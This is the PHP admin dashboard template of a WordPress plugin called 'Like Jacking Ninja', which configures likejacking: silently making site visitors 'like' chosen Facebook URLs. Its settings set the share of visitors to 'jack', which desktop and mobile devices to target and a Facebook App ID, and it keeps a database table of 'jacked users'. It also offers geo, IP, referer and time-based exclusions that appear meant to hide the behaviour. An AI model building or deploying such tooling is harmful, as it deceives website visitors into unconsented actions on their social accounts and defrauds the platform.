<?php

/**
 * Provide a dashboard view for the plugin
 *
 * @package    Like_Jacking_Ninja
 * @subpackage Like_Jacking_Ninja/admin/partials
 */
?>

<!-- This file should primarily consist of HTML with a little bit of PHP. -->
<div class="wrap ljn-form-wrapper">

	<h2><?php echo esc_html(get_admin_page_title()); ?></h2>

	<div>
		<?php $license_data_url = home_url() . '/wp-admin/options-general.php?page=' . $plugin_name_for_urls . '&license_data_page=1'; ?>
		<a href="<?php echo $license_data_url; ?>" class="button button-primary">License data</a>
	</div>

    <div class="remote-banners-container js-banners-container">
        <?php foreach($banners as $banner): ?>
            <a class="ljn-banner js-banner" href="<?php echo $banner['url'] ?>" target="_blank"><img src="<?php echo $banner['src']; ?>" alt=""></a>
        <?php endforeach; ?>
    </div>

    <div class="tabs-container">
        <div class="js-tab-switcher basic-tab active-tab" data-tab="basic">Basic</div>
        <div class="js-tab-switcher advanced-tab" data-tab="advanced">Advanced</div>
    </div>
	<form method="post" action="options.php">

		<?php settings_fields( LikeJackingNinja::PLUGIN_NAME . '_options_group' ); ?>

        <div class="js-basic-container">
    		<table class="form-table">
    			<!-- Global URL -->
    			<tr>
    				<th><?php _e( 'The Facebook URL you would like to jack:'); ?></th>
    				<td class="js-urls-container">
                        <?php 
                            $ljn_urls = (array)get_option('ljn_urls');
                            if(count($ljn_urls) > 0):
                        ?>
                            <?php foreach($ljn_urls as $index => $url): ?>
                                <div>
                                    <input class="long-input" type="text" name="ljn_urls[]" value="<?php echo $url; ?>">
                                    <?php if($index == 0): ?>
                                        <div class="button add js-add-url">+</div>
                                    <?php else: ?>
                                        <div class="button js-delete">x</div>
                                    <?php endif; ?>
                                </div>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <div>
                                <input class="long-input" type="text" name="ljn_urls[]" value="">
                                <div class="button add js-add-url">+</div>
                            </div>
                        <?php endif; ?>
    				</td>
    			</tr>
    		</table>

            <table class="form-table">
                <tr>
                    <th><?php _e( 'Content for the modal box:'); ?></th>
                    <td>
                        <?php
                            $content = get_option('ljn_modal_window_content');
                            if($content == '' || !$content)  {
                                $content = 'Enter your text/content here';
                            }
                            wp_editor($content, 'ljn_modal_window_content', array('textarea_rows' => 6));
                        ?>
                    </td>
                </tr>
            </table>

    		<table class="form-table">
    			<tr>
    				<th><?php _e( 'Percent chance the script will be loaded'); ?></th>
    				<td>
                        <p class="description">
                            <?php _e( 'Enter 100 if you want to jack every user' ); ?>
                        </p>
    					<input type="number" min="0" max="100" name="ljn_percentage" value="<?php echo get_option( 'ljn_percentage' ); ?>">%
    				</td>
    			</tr>
    		</table>

            <h3 class="title"><?php _e('Blocked locations'); ?></h3>
            <table class="form-table">
                <!-- Locations Filter -->
                <tr>
                    <th>
                        <?php _e( 'List of locations which are going to be ignored by the Jacker:' ); ?><br>
                        <div class="button add js-add-location" id="add_locations_row">+</div>
                    </th>
                    <td>
                        <?php $locations = (array) get_option( 'ljn_blocked_locations' ); ?>
                        <p class="description">
                            <?php _e( 'If specifying a country, use the country code instead of the country name, for instance: <em>GB</em> instead of <em>United Kingdom</em>.' ); ?>
                        </p>

                        <div id="locations" class="js-blocked-locations-container">
                            <?php foreach ( $locations as $location ) : ?>
                                <article>
                                    <input type="text" name="ljn_blocked_locations[]" value="<?php echo $location; ?>">
                                    <div class="button js-delete">x</div>
                                </article>
                            <?php endforeach; ?>

                        </div>

                    </td>
                </tr>
                <!-- /Locations Filter -->
            </table>

    		<!-- IP restrictions -->
    		<h3 class="title"><?php _e( 'IP whitelist' ); ?></h3>
    		<div>
    			<textarea name="ljn_blocked_ips"><?php echo esc_html(get_option('ljn_blocked_ips')); ?></textarea>
    			<p class="description">Add IPs separated with space</p>
    		</div>
    		
    		<h3 class="title">Time interval when plugin is disabled</h3>
            <div>
                <label for="ljn_disabled_from">Disabled from</label>
                <input class="js-timepicker" type="datetime" name="ljn_disabled_from" value="<?php echo get_option('ljn_disabled_from'); ?>">
                <label for="ljn_disabled_to">Disabled to</label>
                <input class="js-timepicker" type="datetime" name="ljn_disabled_to" value="<?php echo get_option('ljn_disabled_to'); ?>">
                <p class="description">Provide two values in order to work</p>
            </div>

    		<h3 class="title"><?php _e( 'Referer Check' ); ?></h3>
    		<table class="form-table">
    			<tr>
    				<th>
    					<?php _e( 'Blocked Referer Domains:' ); ?>
    					<br><div class="button add js-add-ref">+</div>
    				</th>

    				<td class="js-blocked-refs-container blocked-refs-container">
    					<?php foreach ((array)get_option('ljn_blocked_refs') as $entry ) : ?>
        					<div>
        						<input
        							type="url"
        							name="ljn_blocked_refs[]"
        							value="<?php echo esc_html( $entry ); ?>"
        						><div class="button js-delete">x</div>
        					</div>
    					<?php endforeach; ?>
    				</td>
    			</tr>
    		</table>
        </div> <!-- end basic tab -->

        <div class="js-advanced-container ljn-advanced-container display-none">
            <div class="display-table">
                <div class="display-tr">
                    <label class="display-td" for="ljn_jack_desktop">Jack desktop devices</label>
                    <div class="display-td">
                        <input name="ljn_jack_desktop" id="ljn_jack_desktop" value="1" <?php echo get_option('ljn_jack_desktop') == 0 ?: 'checked' ?> type="checkbox">
                    </div>
                </div>
                <div class="display-tr">
                    <label class="display-td" for="ljn_jack_mobile">Jack mobile devices</label>
                    <div class="display-td">
                        <input name="ljn_jack_mobile" id="ljn_jack_mobile" value="1" <?php echo get_option('ljn_jack_mobile') == 0 ?: 'checked' ?> type="checkbox">
                    </div>
                </div>
                <div class="display-tr">
                    <label for="ljn_use_app_id" class="display-td">Use App ID</label>
                    <div class="display-td">
                        <input type="checkbox" id="ljn_use_app_id" name="ljn_use_app_id" value="1" <?php echo get_option('ljn_use_app_id') == '1' ? 'checked' : ''; ?>>
                    </div>
                </div>
                <div class="display-tr">
                    <label for="ljn_app_id" class="display-td">App ID</label>
                    <div class="display-td">
                        <input type="text" id="ljn_app_id" name="ljn_app_id" value="<?php echo get_option('ljn_app_id'); ?>">
                    </div>
                </div>
            </div>

            <table class="form-table">
                <tr>
                    <th><?php _e('Flush jacked users table from database'); ?></th>
                    <td>
                        <a href="#" class="js-flush-db button button-primary">Flush</a>
                        <p class="js-flush-message display-inline"></p>
                    </td>
                </tr>
            </table>

        </div>

		<?php submit_button(); ?>

	</form>

</div>